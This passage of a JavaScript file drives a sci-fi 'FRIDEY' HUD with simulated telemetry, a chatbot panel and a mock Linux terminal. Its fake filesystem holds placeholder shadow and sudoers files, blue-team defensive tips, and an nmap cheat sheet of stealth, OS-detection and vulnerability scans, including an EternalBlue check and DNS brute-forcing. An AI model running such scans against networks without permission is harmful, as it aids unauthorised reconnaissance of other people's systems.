/**
 * FRIDEY Core Logic & GOJO Tactical Protocol Engine
 * Telemetry simulation, multilingual command routing (English, Tamil, Malayalam),
 * and interactive neural terminal.
 * Founder & Creator: GOJO. User Address: Gojo.
 */

class FridayCoreEngine {
  constructor() {
    this.terminalEl = document.getElementById('terminalStream');
    this.inputEl = document.getElementById('terminalInput');
    this.sendBtn = document.getElementById('btnSend');
    this.themeSelect = document.getElementById('themeSelect');
    this.muteBtn = document.getElementById('btnAudioToggle');
    this.settingsBtn = document.getElementById('btnSettings');
    this.closeSettingsBtn = document.getElementById('btnCloseSettings');
    this.settingsDrawer = document.getElementById('settingsDrawer');
    this.drawerBackdrop = document.getElementById('drawerBackdrop');
    this.chipsContainer = document.querySelector('.suggestion-chips');

    // Foldable AI Chatbot ("ASK ANYTHING") state & elements
    this.chatbotOpen = true;
    this.colChatbot = document.getElementById('colChatbot');
    this.chatMessagesStream = document.getElementById('chatbotMessagesStream');
    this.chatInput = document.getElementById('chatbotInput');
    this.chatSendBtn = document.getElementById('btnChatSend');
    this.chatMicBtn = document.getElementById('btnChatMic');
    this.btnFoldChatbot = document.getElementById('btnFoldChatbot');
    this.chatbotFoldedRibbon = document.getElementById('chatbotFoldedRibbon');
    this.btnToggleChatbot = document.getElementById('btnToggleChatbot');
    this.btnClearChat = document.getElementById('btnClearChat');

    // 3D AI Agents Virtual Office state & elements (18 Cabins + FRIDEY Master Suite)
    this.officeOpen = true;
    this.colAgentOffice = document.getElementById('colAgentOffice');
    this.btnToggleOffice = document.getElementById('btnToggleOffice');
    this.btnFoldOffice = document.getElementById('btnFoldOffice');
    this.officeFoldedRibbon = document.getElementById('officeFoldedRibbon');

    // Telemetry state
    this.telemetry = {
      arcOutput: 3.24, // Gigawatts
      coreTemp: 74.2,  // Celsius
      armorIntegrity: 98.4, // %
      repulsorCharge: 100,  // %
      thrusterOutput: 94,   // %
      satellitePing: 14     // ms
    };

    this.notes = JSON.parse(localStorage.getItem('fridey_notes') || '[]');

    // Real Linux Terminal state & Virtual Filesystem
    this.terminalOpen = true;
    this.isRoot = false; // Start in normal user mode! Elevates on 'sudo su'
    this.currentUser = 'gojo';
    this.currentDir = '/home/gojo';
    this.cmdHistory = [];
    this.historyIndex = -1;
    this.lastExitCode = 0;
    this.lastPipeInput = '';
    this.aliases = {
      'll': 'ls -la',
      'la': 'ls -a',
      'l': 'ls -CF',
      'cls': 'clear',
      'h': 'history',
      'status': 'uptime'
    };
    this.env = {
      'USER': 'gojo',
      'HOME': '/home/gojo',
      'SHELL': '/bin/bash',
      'PATH': '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/gojo/nmap:/home/gojo/blueteam',
      'PWD': '/home/gojo',
      'HOSTNAME': 'fridey-os',
      'HOST': 'Gojo Technologes Hub',
      'FOUNDER': 'GOJO',
      'TERM': 'xterm-256color',
      'LANG': 'en_US.UTF-8'
    };
    this.vfs = {
      '/': ['root', 'home', 'etc', 'bin', 'sbin', 'var', 'proc', 'sys', 'dev'],
      '/root': ['.bashrc', '.profile', 'quantum_core.key', 'system_override.conf', 'neural_ring0.ko', 'blueteam', 'nmap'],
      '/root/blueteam': ['README.md', 'tools.txt', 'tips.txt', 'ioc_extractor.py', 'log_analyzer.py', 'hash_checker.py', 'yara_builder.py', 'playbooks'],
      '/root/blueteam/playbooks': ['incident_response.md', 'ransomware_response.md', 'threat_hunting.md', 'network_mapping.md'],
      '/root/nmap': ['cheatsheet.txt', 'scripts.txt', 'targets.txt', 'localhost.nmap'],
      '/home': ['gojo'],
      '/home/gojo': ['assets', 'protocols', 'blueteam', 'nmap', 'cli.js', 'canvas.js', 'voice.js', 'core.js', 'audio.js', 'index.html', 'style.css', 'package.json', 'README.md'],
      '/home/gojo/assets': ['core_avatar.jpg', 'hud_bg.jpg'],
      '/home/gojo/protocols': ['house_party.sh', 'veronica.sh', 'combat.sh', 'stealth.sh', 'clean_slate.sh'],
      '/home/gojo/blueteam': ['README.md', 'tools.txt', 'tips.txt', 'ioc_extractor.py', 'log_analyzer.py', 'hash_checker.py', 'yara_builder.py', 'playbooks'],
      '/home/gojo/blueteam/playbooks': ['incident_response.md', 'ransomware_response.md', 'threat_hunting.md', 'network_mapping.md'],
      '/home/gojo/nmap': ['cheatsheet.txt', 'scripts.txt', 'targets.txt', 'localhost.nmap'],
      '/etc': ['os-release', 'hostname', 'hosts', 'sudoers', 'shadow', 'passwd', 'fstab', 'sysctl.conf'],
      '/bin': ['bash', 'zsh', 'ls', 'cat', 'whoami', 'uname', 'google', 'duck', 'wiki', 'neofetch', 'clear', 'mic', 'blueteam', 'bt', 'nmap'],
      '/sbin': ['iptables', 'sysctl', 'reboot', 'poweroff', 'modprobe', 'insmod', 'dmesg', 'systemctl'],
      '/var': ['log', 'run', 'tmp'],
      '/var/log': ['syslog', 'auth.log', 'dmesg.log', 'fridey.log'],
      '/proc': ['cpuinfo', 'meminfo', 'uptime', 'version', 'loadavg'],
      '/sys': ['kernel', 'firmware', 'power', 'module'],
      '/dev': ['null', 'zero', 'urandom', 'arc_reactor0', 'quantum_bus0']
    };
    this.fileContents = {
      'package.json': `{\n  "name": "fridey-ai-hud",\n  "version": "8.4.2",\n  "author": "Gojo",\n  "founder": "GOJO",\n  "main": "cli.js",\n  "system": "GOJO OS Linux 6.8.0-arm64",\n  "privileges": "root:ring-0"\n}`,
      'README.md': `# FRIDEY - GOJO OS v8.4.2 [ROOT ACCESS]\nTactical Holographic AI HUD & Real Linux Command Environment.\nFounder, Owner & Supreme Superuser: GOJO.`,
      '/etc/os-release': `NAME="GOJO OS"\nVERSION="8.4.2 (Gojo Enterprise Root Edition)"\nID=gojo-linux\nPRETTY_NAME="GOJO OS 8.4.2 Tactical GNU/Linux (aarch64 Ring-0)"\nHOME_URL="http://localhost:4173"`,
      '/root/quantum_core.key': `-----BEGIN QUANTUM MASTER ROOT KEY-----\nGOJO-ENTERPRISE-SUPREME-ROOT-RING0-AUTHORIZATION\n94F8A3B12D0E7C55A9B8F4D20188C7E419B20F71D\n-----END QUANTUM MASTER ROOT KEY-----`,
      '/root/system_override.conf': `[ROOT_OVERRIDE]\nOPERATOR="GOJO"\nSECURITY_LEVEL="RING_0_UNRESTRICTED"\nARC_SAFETY_LIMIT="DISABLED"\nDEFENSE_GRID="AUTONOMOUS_ROOT"\nHOST="Gojo Technologes Hub"`,
      '/etc/sudoers': `# /etc/sudoers - Gojo Enterprise Root Configuration\nroot ALL=(ALL:ALL) ALL\ngojo ALL=(ALL:ALL) NOPASSWD: ALL\n%wheel ALL=(ALL:ALL) NOPASSWD: ALL`,
      '/etc/shadow': `root:$6$quantumGojo$a9f83018e7c10b2f90a88:19800:0:99999:7:::\ngojo:$6$supremeBoss$k29f1092e810ab5c1998f:19800:0:99999:7:::`,
      '/etc/passwd': `root:x:0:0:root:/root:/bin/bash\ngojo:x:1000:1000:Gojo (Supreme Founder):/home/gojo:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin`,
      '/proc/cpuinfo': `processor\t: 0 to 7\nmodel name\t: Apple M4 / Quantum Neural Core v8.4\nvendor_id\t: GojoEnterprise\ncore speed\t: 4.40 GHz (Overclocked)\nflags\t\t: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov quantum neural root`,
      '/proc/meminfo': `MemTotal:       16777216 kB\nMemFree:          7340032 kB\nMemAvailable:   14680064 kB\nBuffers:          524288 kB\nCached:          8388608 kB\nSwapTotal:       8388608 kB\nSwapFree:        8388608 kB`,
      '/var/log/fridey.log': `[BOOT] Linux fridey-os kernel 6.8.0-gojo-arm64 loaded.\n[SEC] Ring-0 Root Security Matrix unlocked for Gojo.\n[PWR] Arc Reactor synchronized: 3.24 GW nominal output.\n[AUDIO] Web Audio 48kHz Analyser hardware connected.\n[NET] Gojo Technologes Hub uplink online.`,
      '/home/gojo/blueteam/README.md': `# Blue Team Security Tools Suite\nRepository: https://github.com/A-poc/BlueTeam-Tools\nContains 75+ tools across 13 defensive security domains.\nType 'blueteam' or 'bt' in the terminal for real-time commands.`,
      '/home/gojo/blueteam/tools.txt': `=== BLUE TEAM TOOLS (75 Tools) ===\n1. Threat Hunting: threathunt.app, hunt.io, Validin\n2. Network Mapping: Nmap, Nuclei, Masscan, Angry IP Scanner, ZMap, Shodan\n3. Vulnerability Mgmt: OpenVAS, Nessus Essentials, Nexpose, HackerOne, Lynis\n4. Monitoring & SIEM: Sysmon, Kibana, Logstash, parsedmarc, Phishing Catcher, maltrail, AutorunsToWinEventLog, procfilter, Velociraptor, SysmonSearch, Canary Tokens\n5. Threat Techniques: LOLBAS, GTFOBins, filesec.io, KQL Search, Unprotect, chainsaw, freq, yarGen, EmailAnalyzer, VCG, CyberChef, PersistenceSniper\n6. Threat Intelligence: Maltego, MISP, ThreatConnect, Adversary Emulation Library, Twitter, Facebook ThreatExchange\n7. Incident Response: NIST SP 800-61, Ransomware Playbook, MS IR Guide, Awesome IR\n8. Malware Analysis: VirusTotal, IDA, Ghidra, decode-vbe, pafish, lookyloo, YARA, Cuckoo, Radare2, dnSpy, MTA.net\n9. Forensics & Recovery: SANS SIFT, Sleuth Kit, Autopsy, Recuva, Extundelete, TestDisk\n10. Training: TryHackMe, HackTheBox, CyberDefenders, PhishMe, kc7cyber`,
      '/home/gojo/blueteam/tips.txt': `=== 5 BLUE TEAM PRO TIPS ===\n1. Double-Click Script Block: Associate .vbs/.js with notepad.exe via GPO.\n2. Process Hacker .NET Dump: Inspect assemblies in memory & decompile via dnSpy.\n3. Cryptojacking Proxy Detection: Monitor *xmr.* OR *pool.com OR *pool.org in proxy/DNS.\n4. CyberChef Unicode: Apply 'Remove null bytes' after base64 decoding.\n5. PDF Scrubbed Metadata: Recover history using 'exiftool -PDF-update:all= file.pdf'`,
      '/home/gojo/blueteam/playbooks/incident_response.md': `# NIST SP 800-61 Rev. 2 Incident Response Playbook\nPhase 1: Preparation (Hardening, Sysmon telemetry, backups)\nPhase 2: Detection & Analysis (IOC extraction, SIEM triage, log review)\nPhase 3: Containment, Eradication & Recovery (Host isolation, revoke tokens, re-image)\nPhase 4: Post-Incident Activity (Root cause analysis, lessons learned, update Sigma/YARA rules)`,
      '/home/gojo/blueteam/playbooks/ransomware_response.md': `# Ransomware Emergency Response Playbook\n1. ISOLATE immediately (sever network connections, disable Wi-Fi/NIC).\n2. PRESERVE volatile RAM memory before rebooting.\n3. IDENTIFY ransomware variant using ID Ransomware / file extensions.\n4. LOCATE patient zero via auth.log / Event ID 4624 / proxy logs.\n5. CHECK for free decryptors (NoMoreRansom.org).\n6. RESTORE verified immutable offline backups.`,
      '/home/gojo/nmap/cheatsheet.txt': `=== NMAP QUICK COMMAND CHEATSHEET ===\n* Ping Sweep: nmap -sn 192.168.1.0/24\n* Fast Port Scan: nmap -F 192.168.1.1\n* SYN Stealth Scan: sudo nmap -sS -p 1-1000 192.168.1.1\n* Full Port Range: nmap -p- -T4 target\n* Service Version: nmap -sV -p 80,443,22 target\n* OS Detection: sudo nmap -O target\n* Aggressive Scan: sudo nmap -A target (OS, Versions, NSE, Traceroute)\n* NSE Vulnerability Scan: nmap --script vuln target\n* Save All Formats: nmap -sV -oA scan_output target`,
      '/home/gojo/nmap/scripts.txt': `=== TOP NSE SCRIPTS (Nmap Scripting Engine) ===\n* ssl-cert: Check TLS certificate metadata, SANs, and expiry\n* ssl-enum-ciphers: Discover deprecated ciphers & SSLv3/TLS 1.0\n* http-title: Extract web page HTML <title> tag\n* http-enum: Enumerate administrative paths and web assets\n* smb-vuln-ms17-010: Check EternalBlue SMB vulnerability\n* dns-brute: Brute-force common DNS subdomains\n* vulners: Match detected service CPEs against CVE databases`,
      '/home/gojo/nmap/localhost.nmap': `# Nmap 7.94 scan initiated Thu Oct 22 13:20:00 2026 as: nmap -A localhost\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.00045s latency).\nNot shown: 996 closed tcp ports (reset)\nPORT     STATE SERVICE       VERSION\n22/tcp   open  ssh           OpenSSH 9.6p1 Ubuntu (protocol 2.0)\n80/tcp   open  http          nginx 1.24.0 (Gojo Enterprise Frontend)\n4173/tcp open  http          Python 3.12 http.server (FRIDEY Tactical HUD)\n8443/tcp open  ssl/https-alt Gojo Quantum Bus RPC\n\nDevice type: general purpose\nRunning: Linux 6.X\nOS CPE: cpe:/o:linux:linux_kernel:6.8\nOS details: Linux 6.8.0-gojo-arm64 #1 SMP PREEMPT\nNetwork Distance: 0 hops\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.04 ms localhost (127.0.0.1)\n\nNmap done: 1 IP address (1 host up) scanned in 0.42 seconds`
    };

    this.initEventListeners();
    this.initTelemetryLoop();
    this.initClock();

    // Hook voice recognition callback
    if (window.FridayVoice) {
      window.FridayVoice.onResultCallback = (text) => {
        this.processVoiceInput(text);
      };
      this.updateSuggestionChips();
    }

    // Initial greeting after slight delay
    setTimeout(() => {
      this.fridayGreeting();
    }, 700);
  }

  initEventListeners() {
    // Linux Terminal input submission & keyboard navigation (History + Tab + Ctrl shortcuts)
    if (this.inputEl) {
      this.inputEl.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
          this.submitInput();
        } else if (e.key === 'ArrowUp') {
          e.preventDefault();
          this.handleHistory('up');
        } else if (e.key === 'ArrowDown') {
          e.preventDefault();
          this.handleHistory('down');
        } else if (e.key === 'Tab') {
          e.preventDefault();
          this.handleTabCompletion();
        } else if (e.ctrlKey && e.key.toLowerCase() === 'c') {
          e.preventDefault();
          this.handleSigint();
        } else if (e.ctrlKey && e.key.toLowerCase() === 'l') {
          e.preventDefault();
          this.clearTerminal();
        } else if (e.ctrlKey && e.key.toLowerCase() === 'u') {
          e.preventDefault();
          this.inputEl.value = '';
        }
      });
    }

    if (this.sendBtn) {
      this.sendBtn.addEventListener('click', () => {
        this.submitInput();
      });
    }

    // Click anywhere on terminal panel or stream to focus prompt
    const termPanel = document.getElementById('panelTerminal');
    if (termPanel && this.inputEl) {
      termPanel.addEventListener('click', (e) => {
        if (window.getSelection() && window.getSelection().toString().length > 0) return;
        if (e.target.tagName === 'A' || e.target.tagName === 'BUTTON' || e.target.closest('button')) return;
        this.inputEl.focus();
      });
    }

    // Terminal Open / Close & Window Controls
    const btnToggleTerm = document.getElementById('btnToggleTerminal');
    if (btnToggleTerm) {
      btnToggleTerm.addEventListener('click', () => this.toggleTerminal());
    }

    const btnFloatTerm = document.getElementById('btnFloatTerminal');
    if (btnFloatTerm) {
      btnFloatTerm.addEventListener('click', () => this.toggleTerminal(true));
    }

    const btnTermClose = document.getElementById('btnTermClose');
    if (btnTermClose) {
      btnTermClose.addEventListener('click', () => this.toggleTerminal(false));
    }

    const btnTermMinimize = document.getElementById('btnTermMinimize');
    if (btnTermMinimize) {
      btnTermMinimize.addEventListener('click', () => this.toggleTerminal(false));
    }

    const btnClosePanel = document.getElementById('btnCloseTerminalPanel');
    if (btnClosePanel) {
      btnClosePanel.addEventListener('click', () => this.toggleTerminal(false));
    }

    const btnTermMaximize = document.getElementById('btnTermMaximize');
    if (btnTermMaximize) {
      btnTermMaximize.addEventListener('click', () => {
        const termPanel = document.getElementById('panelTerminal');
        if (termPanel) {
          termPanel.classList.toggle('is-maximized');
          const isMax = termPanel.classList.contains('is-maximized');
          this.showToast(isMax ? 'Terminal: FULLSCREEN SINGLE COLUMN VIEW' : 'Terminal: STANDARD SINGLE COLUMN VIEW');
          if (window.FridayAudio) window.FridayAudio.playClick();
        }
      });
    }

    // Voice activation button (top right corner nearby volume)
    const micBtn = document.getElementById('btnActivateVoice');
    if (micBtn) {
      micBtn.addEventListener('click', async () => {
        if (window.FridayVoice) {
          if (window.FridayVoice.isMicMuted || window.FridayVoice.isMicBlockedTemporarily) {
            await window.FridayVoice.setMicMuted(false);
            this.showToast('Microphone Access Restored & Armed');
          } else {
            await window.FridayVoice.toggleListening();
          }
        }
      });
    }

    // Central holographic core click listener to also trigger voice
    const canvasEl = document.getElementById('hudCoreCanvas');
    if (canvasEl) {
      canvasEl.addEventListener('click', async () => {
        if (window.FridayVoice) {
          if (window.FridayVoice.isMicMuted || window.FridayVoice.isMicBlockedTemporarily) {
            await window.FridayVoice.setMicMuted(false);
            this.showToast('Microphone Access Restored & Armed');
          } else {
            await window.FridayVoice.toggleListening();
          }
        }
      });
    }

    // Audio Mute/Unmute
    if (this.muteBtn) {
      this.muteBtn.addEventListener('click', () => {
        if (window.FridayAudio) {
          const enabled = window.FridayAudio.toggleSound();
          this.muteBtn.classList.toggle('active', !enabled);
          this.showToast(enabled ? 'Audio Feedback Enabled' : 'Audio Feedback Muted');
          if (enabled) window.FridayAudio.playClick();
        }
      });
    }

    // Theme selector
    if (this.themeSelect) {
      this.themeSelect.addEventListener('change', (e) => {
        this.setTheme(e.target.value);
      });
    }

    // Settings Drawer
    if (this.settingsBtn && this.settingsDrawer && this.drawerBackdrop) {
      this.settingsBtn.addEventListener('click', () => {
        this.settingsDrawer.classList.add('open');
        this.drawerBackdrop.classList.add('open');
        if (window.FridayAudio) window.FridayAudio.playClick();
      });

      const closeDrawer = () => {
        this.settingsDrawer.classList.remove('open');
        this.drawerBackdrop.classList.remove('open');
        if (window.FridayAudio) window.FridayAudio.playClick();
      };

      if (this.closeSettingsBtn) {
        this.closeSettingsBtn.addEventListener('click', closeDrawer);
      }
      this.drawerBackdrop.addEventListener('click', closeDrawer);
    }

    // Voice slider controls
    const pitchSlider = document.getElementById('pitchSlider');
    const rateSlider = document.getElementById('rateSlider');
    if (pitchSlider && window.FridayVoice) {
      pitchSlider.addEventListener('input', (e) => {
        window.FridayVoice.pitch = parseFloat(e.target.value);
        document.getElementById('pitchVal').textContent = `${e.target.value}x`;
      });
    }
    if (rateSlider && window.FridayVoice) {
      rateSlider.addEventListener('input', (e) => {
        window.FridayVoice.rate = parseFloat(e.target.value);
        document.getElementById('rateVal').textContent = `${e.target.value}x`;
      });
    }

    // Protocol Buttons
    document.querySelectorAll('.btn-protocol').forEach(btn => {
      btn.addEventListener('click', () => {
        const proto = btn.getAttribute('data-protocol');
        if (proto) {
          this.executeProtocol(proto);
        }
      });
    });

    // ==========================================
    // Foldable AI Chatbot ("ASK ANYTHING") Event Listeners
    // ==========================================
    if (this.chatInput) {
      this.chatInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
          e.preventDefault();
          this.sendChatMessage(this.chatInput.value);
        }
      });
    }

    if (this.chatSendBtn) {
      this.chatSendBtn.addEventListener('click', () => {
        if (this.chatInput) this.sendChatMessage(this.chatInput.value);
      });
    }

    if (this.btnFoldChatbot) {
      this.btnFoldChatbot.addEventListener('click', () => this.toggleChatbot(false));
    }

    if (this.btnToggleChatbot) {
      this.btnToggleChatbot.addEventListener('click', () => this.toggleChatbot());
    }

    if (this.chatbotFoldedRibbon) {
      this.chatbotFoldedRibbon.addEventListener('click', () => this.toggleChatbot(true));
    }

    if (this.btnClearChat) {
      this.btnClearChat.addEventListener('click', () => this.clearChatHistory());
    }

    // 3D AI Agents Virtual Office Listeners (Permanently Open & Expanded)
    if (this.btnToggleOffice) {
      this.btnToggleOffice.addEventListener('click', () => {
        if (window.FridayAgents && typeof window.FridayAgents.toggleOffice === 'function') {
          window.FridayAgents.toggleOffice(true);
        }
      });
    }


    document.querySelectorAll('.chat-chip').forEach(chip => {
      chip.addEventListener('click', () => {
        const query = chip.getAttribute('data-query');
        if (query) this.sendChatMessage(query);
      });
    });

    if (this.chatMicBtn) {
      this.chatMicBtn.addEventListener('click', async () => {
        if (window.FridayVoice) {
          if (window.FridayVoice.isMicMuted || window.FridayVoice.isMicBlockedTemporarily) {
            await window.FridayVoice.setMicMuted(false);
            this.showToast('Microphone Access Restored for Chatbot');
          } else {
            await window.FridayVoice.toggleListening();
            if (window.FridayVoice.isListening) {
              this.showToast('Voice Mic Activated for Chatbot');
            }
          }
        }
      });
    }

    // Tactical Swipe Mic Off/On Switch
    this.initSwipeMicToggle();

    // Tamil Voice Chat Button & Chip listeners
    const btnTamil = document.getElementById('btnTamilVoiceChat');
    if (btnTamil) {
      btnTamil.addEventListener('click', () => this.activateTamilVoiceChat());
    }

    const chipTamilToggle = document.getElementById('chipToggleTamil');
    if (chipTamilToggle) {
      chipTamilToggle.addEventListener('click', () => this.activateTamilVoiceChat());
    }
  }

  updateSuggestionChips() {
    if (!this.chipsContainer) return;

    const chipData = [
      { cmd: 'whoami', label: 'whoami' },
      { cmd: 'sudo su', label: 'sudo su' },
      { cmd: 'neofetch', label: 'neofetch' },
      { cmd: 'ls -la', label: 'ls -la' },
      { cmd: 'ps aux', label: 'ps aux' },
      { cmd: 'df -h', label: 'df -h' },
      { cmd: 'free -m', label: 'free -m' },
      { cmd: 'cat /etc/os-release', label: 'cat /etc/os-release' },
      { cmd: 'nmap -A localhost', label: 'nmap -A localhost' },
      { cmd: 'blueteam', label: 'blueteam' },
      { cmd: 'help', label: 'help' },
      { cmd: 'clear', label: 'clear' }
    ];

    this.chipsContainer.innerHTML = '';
    chipData.forEach(item => {
      const btn = document.createElement('button');
      btn.className = 'chip';
      btn.setAttribute('data-cmd', item.cmd);
      btn.textContent = item.label;
      btn.addEventListener('click', () => {
        if (this.inputEl) {
          this.inputEl.value = item.cmd;
          this.submitInput();
          this.inputEl.focus();
        }
      });
      this.chipsContainer.appendChild(btn);
    });
  }

  setTheme(themeName) {
    document.body.setAttribute('data-theme', themeName);
    if (this.themeSelect) this.themeSelect.value = themeName;
    if (window.FridayNeuralBg) window.FridayNeuralBg.updateTheme();
    if (window.FridayAudio) window.FridayAudio.playClick();
    this.showToast(`HUD Theme: ${themeName.toUpperCase().replace('-', ' ')}`);
  }

  initClock() {
    const updateTime = () => {
      const now = new Date();
      const rawHours = now.getHours();
      const ampm = rawHours >= 12 ? 'PM' : 'AM';
      const hours12 = String(rawHours % 12 || 12).padStart(2, '0');
      const minutes = String(now.getMinutes()).padStart(2, '0');
      const seconds = String(now.getSeconds()).padStart(2, '0');
      const timeStr = `${hours12}:${minutes}:${seconds} ${ampm}`;

      const options = { weekday: 'short', month: 'short', day: 'numeric', year: 'numeric' };
      const dateStr = now.toLocaleDateString('en-US', options).toUpperCase();

      const clockEl = document.getElementById('hudTimeClock');
      const dateEl = document.getElementById('hudTimeDate');

      if (clockEl) clockEl.textContent = `${timeStr} LCL`;
      if (dateEl) dateEl.textContent = dateStr;
    };

    updateTime();
    setInterval(updateTime, 1000);
  }

  initTelemetryLoop() {
    setInterval(() => {
      this.telemetry.arcOutput = +(3.24 + (Math.sin(Date.now() / 3000) * 0.08) + (Math.random() * 0.02 - 0.01)).toFixed(2);
      this.telemetry.coreTemp = +(74.0 + (Math.sin(Date.now() / 4500) * 0.9) + (Math.random() * 0.2)).toFixed(1);
      this.telemetry.satellitePing = Math.floor(12 + Math.random() * 5);

      const arcValEl = document.getElementById('arcPowerVal');
      const coreTempEl = document.getElementById('coreTempDisplay');
      const satPingEl = document.getElementById('satPingDisplay');

      if (arcValEl) arcValEl.textContent = this.telemetry.arcOutput;
      if (coreTempEl) coreTempEl.textContent = `${this.telemetry.coreTemp}°C`;
      if (satPingEl) satPingEl.textContent = `${this.telemetry.satellitePing}ms`;

      const gaugeEl = document.getElementById('arcGaugePath');
      if (gaugeEl) {
        const offset = 440 - (this.telemetry.arcOutput / 4.0) * 340;
        gaugeEl.style.strokeDashoffset = offset;
      }
    }, 1500);
  }

  // Linux Terminal Display Path Helper with Root Support
  getDisplayPath() {
    const homeDir = this.isRoot ? '/root' : '/home/gojo';
    if (this.currentDir === homeDir) return '~';
    if (this.currentDir.startsWith(homeDir + '/')) return '~/' + this.currentDir.slice((homeDir + '/').length);
    if (this.currentDir === '/home/gojo' && this.isRoot) return '/home/gojo';
    return this.currentDir;
  }

  updatePromptPath() {
    const pathEl = document.getElementById('termCurrentPath');
    const userLabel = document.getElementById('termUserLabel');
    const promptChar = document.getElementById('termPromptChar');
    const titleText = document.getElementById('termTitleText');
    const displayPath = this.getDisplayPath();
    const userStr = this.isRoot ? 'root@fridey' : 'gojo@fridey';
    const char = this.isRoot ? '#' : '$';

    if (pathEl) pathEl.textContent = displayPath;
    if (userLabel) {
      userLabel.textContent = userStr;
      if (this.isRoot) userLabel.classList.add('root-user');
      else userLabel.classList.remove('root-user');
    }
    if (promptChar) {
      promptChar.textContent = char;
      if (this.isRoot) promptChar.classList.add('root-char');
      else promptChar.classList.remove('root-char');
    }
    if (titleText) {
      titleText.textContent = `${this.isRoot ? 'root' : 'gojo'}@fridey-os: ${displayPath} (bash)${this.isRoot ? ' [ROOT ACCESS]' : ''}`;
    }
    const rootBadge = document.getElementById('termRootBadge');
    if (rootBadge) {
      rootBadge.style.display = this.isRoot ? 'inline-block' : 'none';
    }
  }

  // Terminal Window Open / Close Toggle Controller
  toggleTerminal(forceOpen = null) {
    const rightCol = document.getElementById('rightColTerminal');
    const gridLayout = document.querySelector('.hud-grid-layout');
    const btnToggle = document.getElementById('btnToggleTerminal');
    const btnFloat = document.getElementById('btnFloatTerminal');

    if (forceOpen !== null) {
      this.terminalOpen = forceOpen;
    } else {
      this.terminalOpen = !this.terminalOpen;
    }

    if (this.terminalOpen) {
      if (rightCol) rightCol.classList.remove('terminal-closed');
      if (gridLayout) gridLayout.classList.remove('terminal-closed');
      if (btnToggle) btnToggle.classList.add('active');
      if (btnFloat) btnFloat.classList.remove('visible');
      if (this.inputEl) setTimeout(() => this.inputEl.focus(), 120);
      this.showToast('Terminal Console: OPEN');
    } else {
      if (rightCol) rightCol.classList.add('terminal-closed');
      if (gridLayout) gridLayout.classList.add('terminal-closed');
      if (btnToggle) btnToggle.classList.remove('active');
      if (btnFloat) btnFloat.classList.add('visible');
      this.showToast('Terminal Console: MINIMIZED');
    }

    if (window.FridayAudio) window.FridayAudio.playClick();
  }

  clearTerminal() {
    if (!this.terminalEl) return;
    const activeLine = document.getElementById('termActiveLine');
    this.terminalEl.innerHTML = '';
    if (activeLine) {
      this.terminalEl.appendChild(activeLine);
    }
    if (this.inputEl) {
      this.inputEl.value = '';
      this.inputEl.focus();
    }
    this.showToast('Terminal Screen Cleared');
    if (window.FridayAudio) window.FridayAudio.playClick();
  }

  // Keyboard History Navigation (Arrow Up / Down)
  handleHistory(direction) {
    if (!this.inputEl || this.cmdHistory.length === 0) return;
    if (direction === 'up') {
      if (this.historyIndex > 0) {
        this.historyIndex--;
        this.inputEl.value = this.cmdHistory[this.historyIndex];
      }
    } else if (direction === 'down') {
      if (this.historyIndex < this.cmdHistory.length - 1) {
        this.historyIndex++;
        this.inputEl.value = this.cmdHistory[this.historyIndex];
      } else {
        this.historyIndex = this.cmdHistory.length;
        this.inputEl.value = '';
      }
    }
  }

  // Handle Ctrl+C (SIGINT)
  handleSigint() {
    if (!this.terminalEl || !this.inputEl) return;
    const currentVal = this.inputEl.value;
    const userClass = this.isRoot ? 'p-user root-user' : 'p-user';
    const charClass = this.isRoot ? 'p-prompt-char root-char' : 'p-prompt-char';
    const userStr = this.isRoot ? 'root@fridey' : 'gojo@fridey';
    const char = this.isRoot ? '#' : '$';

    const line = document.createElement('div');
    line.className = 'term-line term-cmd-line';
    line.innerHTML = `<span class="t-prompt-str"><span class="${userClass}">${userStr}</span><span class="p-colon">:</span><span class="p-path">${this.getDisplayPath()}</span><span class="${charClass}">${char}</span></span> <span class="t-cmd-text">${this.escapeHTML(currentVal)}</span><span class="term-sigint">^C</span>`;
    
    const activeLine = document.getElementById('termActiveLine');
    if (activeLine && activeLine.parentNode === this.terminalEl) {
      this.terminalEl.insertBefore(line, activeLine);
    } else {
      this.terminalEl.appendChild(line);
    }
    this.terminalEl.scrollTop = this.terminalEl.scrollHeight;

    this.inputEl.value = '';
    this.lastExitCode = 130;
  }

  // Tab Auto-Completion (Commands & Files)
  handleTabCompletion() {
    if (!this.inputEl) return;
    const current = this.inputEl.value;
    if (!current.trim()) return;

    const parts = current.split(/\s+/);
    if (parts.length === 1) {
      const cmdPrefix = parts[0].toLowerCase();
      const allCmds = [
        'help', 'man', 'ls', 'pwd', 'cd', 'cat', 'head', 'tail', 'grep', 'wc',
        'touch', 'mkdir', 'rmdir', 'rm', 'cp', 'mv', 'find', 'echo', 'printf',
        'whoami', 'id', 'groups', 'uname', 'hostname', 'uptime', 'date', 'cal',
        'ps', 'top', 'htop', 'kill', 'pkill', 'free', 'df', 'ifconfig', 'ip',
        'netstat', 'ss', 'ping', 'curl', 'wget', 'export', 'env', 'printenv',
        'unset', 'alias', 'unalias', 'which', 'whereis', 'apt', 'systemctl',
        'service', 'dmesg', 'iptables', 'sysctl', 'chmod', 'chown', 'sudo', 'su',
        'exit', 'logout', 'clear', 'reset', 'history', 'neofetch', 'fastfetch',
        'mic', 'google', 'duck', 'wiki', 'bing', 'brave', 'search',
        'nmap', 'blueteam', 'bt', 'fridey', 'ai', 'ask',
        'houseparty', 'veronica', 'combat', 'stealth', 'cleanslate', 'surge', 'diagnostics'
      ];
      const matches = allCmds.filter(c => c.startsWith(cmdPrefix));
      if (matches.length === 1) {
        this.inputEl.value = matches[0] + ' ';
        if (window.FridayAudio) window.FridayAudio.playClick();
      } else if (matches.length > 1) {
        this.printCommand(current);
        this.printStdout(matches.join('  '));
      }
    } else {
      const lastArg = parts[parts.length - 1];
      const curFiles = this.vfs[this.currentDir] || [];
      const matches = curFiles.filter(f => f.toLowerCase().startsWith(lastArg.toLowerCase()));
      if (matches.length === 1) {
        parts[parts.length - 1] = matches[0];
        this.inputEl.value = parts.join(' ');
        if (window.FridayAudio) window.FridayAudio.playClick();
      } else if (matches.length > 1) {
        this.printCommand(current);
        this.printStdout(matches.join('  '));
      }
    }
  }

